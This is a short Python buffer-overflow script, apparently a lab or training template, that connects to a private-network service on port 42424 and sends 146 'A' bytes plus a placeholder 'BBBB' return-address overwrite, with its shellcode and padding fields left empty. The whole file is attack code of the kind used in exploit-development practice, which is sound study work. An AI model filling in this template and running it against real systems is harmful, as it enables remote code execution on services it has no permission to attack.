#!/usr/bin/python3

import socket

ip = "192.168.13.135"
port = 42424

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload =""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send((buffer + "\r\n").encode())
    print("Done!")
except:
    print("Could not connect.")
